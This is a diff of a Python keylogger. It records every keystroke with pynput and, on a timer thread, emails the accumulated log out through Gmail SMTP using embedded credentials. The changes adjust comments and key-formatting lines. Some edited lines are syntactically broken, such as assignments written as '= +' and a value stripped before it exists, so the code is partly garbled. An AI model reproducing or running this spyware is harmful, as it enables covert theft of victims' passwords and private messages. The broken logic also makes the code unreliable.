@@ -1,5 +1,4 @@
 #!/usr/bin/env python
-
 import pynput.keyboard
 import threading
 import smtplib
@@ -16,22 +15,22 @@ class Keylogger: #blueprint for code to make it more readable
 
     def process_key_press(self, key):
         try: #regular keys
-            current_key = str(key.char) #log = whatever is in the log + whatever the user enters. key.char lets us see each character
+            current_key = str(key) #log = whatever is in the log + whatever the user enters. key.char lets us see each character
         except AttributeError: #lets special keys work 
             if key == key.space:
                 current_key = + " "
             else:
-                current_key = + " " + str(key) + " " #puts space after character
-        self.append_to_log(current_key)
+                current_key = + current_key.strip() #puts space after character
+        self.append_to_log(current_key.strip("'") + " ")
 
     def report(self): #calling report fuction on itself
         self.send_mail(self.email, self.password, "\n\n" + self.log) #skip header. email placed in content of message
         self.log = "" #print empty log
         timer = threading.Timer(self.interval, self.report) #timer will run on a seperate thread. Thread will allow log and listener to work at the same time.
-        timer.start() #when run, timer will wait 5 seconds and call report again 
+        timer.start() #when run, timer will wait x seconds and call report again 
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server = smtplib.SMTP("smtp.gmail.com", 587) #gmail
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
